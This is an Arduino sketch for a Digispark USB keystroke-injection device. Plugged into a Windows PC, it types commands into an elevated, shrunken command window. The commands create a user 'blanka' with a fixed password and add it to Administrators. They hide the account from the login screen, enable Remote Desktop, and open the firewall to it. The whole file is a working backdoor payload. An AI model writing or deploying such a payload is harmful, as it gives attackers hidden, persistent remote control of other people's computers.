#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  
  //run
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);

  //starting taskmanager
  DigiKeyboard.println("taskmgr"); 
  DigiKeyboard.delay(500);

  //run
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT); 
  DigiKeyboard.sendKeyStroke(KEY_N);
  DigiKeyboard.delay(500);

  //start cmd
  DigiKeyboard.print("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.sendKeyStroke(KEY_TAB); 
  
  //turn on admin privileges
  DigiKeyboard.sendKeyStroke(KEY_SPACE);

  //run
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(200);

  //killing taskmanager
  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");
  DigiKeyboard.delay(500);  

  //adding user
  DigiKeyboard.println("net user blanka Ping@123 /ADD");
  DigiKeyboard.delay(500);

  //adding user to admin group
  DigiKeyboard.println("net localgroup Administrators blanka /ADD");
  DigiKeyboard.delay(500);

  //Hiding user from login screen
  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v blanka /t REG_DWORD /d 0 /f"));
  DigiKeyboard.delay(500);

  //Turning Remote desktop
  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"));
  DigiKeyboard.delay(500);

  //Allowing remote desktop through firewall
  DigiKeyboard.println(F("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes"));
  DigiKeyboard.delay(500);

  //adding created user to remote desktop group
  DigiKeyboard.println("net localgroup \"Remote Desktop Users\" blanka /add");
  DigiKeyboard.delay(500);  

  //adding created user to remote desktop group
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(500);

  //turn on led when program finishes
  digitalWrite(1, HIGH); 
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
